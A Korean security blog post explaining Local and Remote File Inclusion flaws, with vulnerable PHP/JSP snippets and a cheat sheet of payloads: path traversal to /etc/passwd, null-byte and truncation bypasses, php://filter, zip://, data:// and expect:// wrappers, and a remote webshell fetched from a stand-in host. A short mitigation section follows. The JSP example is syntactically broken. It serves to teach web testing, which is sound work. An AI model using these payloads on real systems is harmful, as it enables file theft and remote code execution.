---
layout: single
title: File Inclusion (LFI/RFI)
categories: Web-vuln
tag: [File Inclusion, LFI,RFI, web, web vulnerability, injection]
toc: true
author_profile: false
---

# File Inclusion 취약점이란?

> 해당 취약점은 응용 프로그램에서 File을 불러 올 때 include를 사용하여 코드내에 Built 하거나 동적으로 파일을 포함하는 로직이 구현되어있을경우 일반적으로 나타나며, 다른 Path Traversal 과 같은 타 취약저믈과 연계될 수 있다.

💡 **<u>이러한 File Inclusion은 Local File Inclusion(LFI)와 Remote File Inclusion(RFI)로 나뉜다.</u>** 
{: .notice--primary} 

```javascript
$file = $_GET['file'];

include('testdircetory/' . $file);
```

위와같은 코드는 File Inclusion에 취약한 코드라고 볼 수 있다. 위와 같이 구현되어 있을 경우<br>
아래와 같은 취약점으로 이어질 수 있다.

```
http://test.com/?file=../../../etc/passwd
```

# Local File Inclusion
로컬에 존재하는 파일, 현재 서버에 존재하고 있는 파일을 실행할 수 있으며, 웹 서버의 엑세스 로그, 패스워드파일 등 민감한 파일을 열거 할 수 있으며, 해당 서버에 공격자가 File Upload 취약점을 통해 웹 쉘을 올려놓았어도 이를 Include 시킬 수 있다.

```
GET /testlfi?path=file:///etc/passwd
```

# Remote File Inclusion
원격지에서 파일을 읽어들여 이를 inclusion 하는 취약점이며, 공격자가 본인의 서버에 웹쉘을 미리 생성하여 이를 Inclusion 할 수 있다.<br>
http, ftp uri형식으로 보통 가져온다.

```
GET /testrfi?lib=https://eval.com/webshell.php
```

# 공격 표면
file을 읽은 후 이를 가져올 수 있는 구간이면 해당 취약점을 의심해볼 수 있다. 절대경로 또는 상대경로를 통해 요청을 하였을 시 요청 경로가 삭제되지 않는다면 LFI는 발생한다.

## 언어별 취약 코드 로직

<div class="notice--primary" markdown="1">

- PHP

```php
<?php
if (isset($_GET['file'])) {
    include($_GET['file'] . '.php');
}
?>
```

- JSP

```jsp
<%
   String p = request.getParameter("p");
   @include file="<%="includes/" + p +".jsp"%>"
%>
```

<hr>

```
GET /testlfi?path=file:///etc/passwd
'''
or
'''
GET /testlfi?path=file=../../../../etc/passwd
```
위와같이 테스트해볼 수 있다. 
</div>

# Bypass - File Inclusion

## Null Byte injection

```php
<?php include($_GET['file'].".php"); ?>
```

위와같이 .php 확장자의 파일만 불러올 수 있게 되어있다면, null 바이트 문자를 통해 이를 우회할 수 있다.
> null을 가르키는 특수 바이트 이후의 모든 문자는 무시된다.

```
file=../../../../etc/passwd%00.php
```

## Path and Dot 
PHP 파일 이름은 4096 바이트로 제한되며, 해당 바이트보다 많은 바이트의 이름을 가지고 있다면 PHP는 파일 이름을 자르고 추가 문자를 버리게된다. 해당 방법은 오류가 발생되지 않고 정상적으로 PHP가 동작하게 된다. 이때 쓰레기 값으로 인코딩, DOUBLE 인코딩, 유니코드 인코딩 등의 값으로 채우면 된다.

```
GET /testlfi?path=file=../../../../etc/passwd...............
GET /testlfi?path=file=../../../../etc/passwd\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\
GET /testlfi?path=file=../../../../etc/passwd/././././././././././././././.
GET /testlfi?path=file=../../../../../../../../../../../../../etc/passwd
```

## PHP Filter
php의 filter은 로컬 파일 시스템에 access 하는데 사용되며, 특히 서버가 파일을 실행하지 못하게 하는 파일의 내용을 가져오는 데 악용할 수 있다.

```
http://[site]/index.php?page=php://filter/convert.base64-encode/resource=FILE
```

위와같이 보낼경우 FILE은 base64로 인코딩된 값을 받아오며, 이를 다시 디코딩하게되면 확인할 수 있다.

<div class="notice">
php://filter/convert.base64-encode/resource=FILE<br>
php://filter/convert.iconv.utf-8.utf-16/resource=FILE<br>
php://filter/convert.base64-encode/resource=FILE<br>
php://filter/zlib.deflate/convert.base64-encode/resource=FILE<br>
rot13 사용도 생각해두자.
</div>

## PHP ZIP
php filter와 같이 php의 wraper 이며, zip파일을 통한 우회가 가능하다.
1. 원하고자 하는 php 파일 생성 ex)shell.php
2. zip 파일로 압축 ex)target.zip
3. zip 파일의 확장자를 jpg과 같이 변경하여 확장 유효성 검사를 우회 후 공격 대상 사이트에 업로드
4. /test/image/upload/ 에 저장되어있을 경우 url을 통해 zip wraper을 실행
5. zip:///test/image/upload/target.jpg%23shell.php

```
http://[site]/index.php?page=zip:///test/image/upload/target.jpg%23shell.php
```

## PHP Data Scheme
원하고자 하는 데이터(쉘코드)를 base64로 인코딩하여 data 스킴을 사용하여 우회할 수 있다.
> 원형 : data://text/plain;base64,BASE64_STR

```
http://[site]/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9wYXNzd2QnKTsgPz4=

// base64 -> <?php echo file_get_contents('/etc/passwd'); ?>
```

## PHP expect
해당 wrapper은 표준입출력 및 표준에러를 통해 프로세스에 대한 액세스를 제공한다. 시스템 명령을 가져올 수 있다.

```
GET /index.php?file=expect://id
GET /index.php?file=expect://ls
```

# 대응 방안
사용자이 입력값 검증을 통해 파일 이름의 크기범위에 대해 제한하며, 특수문자등 필터링이 적절히 이루어져야한다. 또한 URI 에 대한 화이트리스트 기반의 정책을 설정해야한다.

# Referance
- https://www.hahwul.com/cullinan/file-inclusion/
- https://en.wikipedia.org/wiki/File_inclusion_vulnerability#Local_file_inclusion
- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion